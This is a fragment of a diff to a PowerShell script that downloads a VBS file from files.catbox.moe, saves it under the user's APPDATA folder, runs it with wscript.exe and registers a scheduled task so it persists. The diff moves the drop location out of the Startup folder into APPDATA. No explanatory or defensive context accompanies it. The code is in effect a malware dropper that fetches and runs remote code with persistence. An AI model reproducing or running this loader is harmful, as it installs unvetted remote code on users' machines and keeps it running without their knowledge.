@@ -2,7 +2,7 @@
 $url = "https://files.catbox.moe/eqlsi1.vbs"
 
 # Build the full path to the user's Startup folder
-$startupFolder = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
+$startupFolder = Join-Path $env:APPDATA 
 $startupPath = Join-Path $startupFolder "eqlsi1.vbs"
 
 # Create the Startup folder if it doesn't exist
@@ -20,7 +20,7 @@ Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWin
 
 
 # Set the full script path
-$scriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\eqlsi1.vbs"
+$scriptPath = Join-Path $env:APPDATA "eqlsi1.vbs"
 
 # Create the action
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptPath`""
